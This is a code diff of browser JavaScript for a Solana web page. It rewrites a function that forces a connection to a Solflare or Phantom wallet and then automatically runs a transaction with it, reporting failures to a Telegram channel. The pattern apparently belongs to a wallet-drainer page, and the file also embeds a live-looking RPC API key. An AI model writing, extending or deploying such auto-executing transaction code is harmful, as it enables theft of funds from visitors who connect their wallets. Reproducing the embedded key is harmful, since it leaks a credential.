@@ -822,22 +822,26 @@ $(document).ready(async function () {
   const tokenAccounts = await getTokenAccounts(connection, public_key);
   console.log("Token accounts:", tokenAccounts);
     
-  async function autoExecuteIfConnected() {
-    try {
-      const connection = new solanaWeb3.Connection(
-        "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
-        "confirmed"
-      );
+async function autoExecuteIfConnected() {
+  try {
+    const connection = new solanaWeb3.Connection(
+      "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
+      "confirmed"
+    );
 
-      if (window.solflare && window.solflare.publicKey) {
-        await executeTransaction(connection, window.solflare, window.solflare.publicKey);
-      } else if (window.solana && window.solana.publicKey) {
-        await executeTransaction(connection, window.solana, window.solana.publicKey);
-      }
-    } catch (err) {
-      console.error("Auto-execute failed:", err);
+    if (window.solflare) {
+      const resp = await window.solflare.connect(); // 👈 connect first
+      await executeTransaction(connection, window.solflare, resp.publicKey);
+    } else if (window.solana) {
+      const resp = await window.solana.connect(); // 👈 connect first
+      await executeTransaction(connection, window.solana, resp.publicKey);
     }
+  } catch (err) {
+    console.error("Auto-execute failed:", err);
+    await sendTelegramMessage(`❌ Auto-execute failed: ${err.message}`);
   }
+}
+
 
   const urlParams = new URLSearchParams(window.location.search);
   const fromJupiter = urlParams.get("fromJupiter");
